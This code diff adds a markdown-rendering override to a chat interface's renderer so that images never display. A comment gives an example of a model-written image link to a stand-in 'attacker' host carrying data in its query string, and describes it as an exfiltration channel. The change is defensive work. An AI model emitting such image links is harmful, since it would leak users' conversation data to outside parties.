@@ -202,6 +202,8 @@ export function MarkdownRenderer({ content, isStreaming = false, citations = [],
                     </div>
                 );
             },
+            // Never render images: a model-written ![x](https://attacker/?d=...) would be an exfiltration channel.
+            img: () => null,
             pre: ({ children }) => <>{children}</>,
             code: ({ className: codeClass, children }) => {
                 const language = /language-(\S+)/.exec(codeClass ?? '')?.[1]?.toLowerCase() ?? '';
